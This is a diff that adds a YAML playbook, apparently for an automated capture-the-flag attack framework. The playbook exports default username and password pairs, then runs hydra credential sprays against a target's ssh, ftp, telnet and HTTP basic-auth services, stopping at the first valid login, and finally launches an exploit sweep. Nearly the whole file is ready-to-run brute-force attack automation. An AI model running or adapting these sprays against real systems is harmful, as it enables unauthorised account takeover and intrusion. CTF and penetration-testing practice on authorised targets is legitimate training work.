@@ -1,0 +1,57 @@
+name: ctf_creds_spray
+version: 2
+description: Credential path for CTF boxes; default-cred knowledge base export, then targeted service sprays for ssh, ftp, telnet and http basic.
+enabled: true
+tags:
+  - ctf
+  - credentials
+  - creds
+  - ssh
+  - ftp
+  - telnet
+platforms:
+  - linux
+total_timeout: 3600
+steps:
+  - id: bind
+    phase: credential_access
+    run: assign target {target}
+    description: bind the box into payload params
+  - id: creds_export
+    phase: credential_access
+    run: lazycreds --export sessions/lazycreds_top25_{target}.txt 1000
+    description: export the default-cred knowledge base into user:pass pairs for hydra
+    timeout: 120
+  - id: ssh_spray
+    phase: credential_access
+    run: hydra -C sessions/lazycreds_top25_{target}.txt -f -u {target} ssh -t 4
+    description: combo spray over ssh; stops at the first valid login
+    timeout: 900
+    continue_on_error: true
+    capture: ssh_spray_out
+  - id: ftp_spray
+    phase: credential_access
+    run: hydra -C sessions/lazycreds_top25_{target}.txt -f -u {target} ftp -t 6
+    description: combo spray over ftp
+    timeout: 900
+    continue_on_error: true
+    parallel: true
+  - id: telnet_spray
+    phase: credential_access
+    run: hydra -C sessions/lazycreds_top25_{target}.txt -f -u {target} telnet -t 4
+    description: combo spray over telnet
+    timeout: 900
+    continue_on_error: true
+    parallel: true
+  - id: http_basic_spray
+    phase: credential_access
+    run: hydra -C sessions/lazycreds_top25_{target}.txt -f {target} http-get /
+    description: combo spray over http basic, always on port 80 is wrong for many ctfs so keep continue_on_error true
+    timeout: 900
+    continue_on_error: true
+    parallel: true
+  - id: sweep
+    phase: exploit
+    run: atomic_exploit
+    description: let credential-backed triggers fire the exploit sweep
+    timeout: 1800
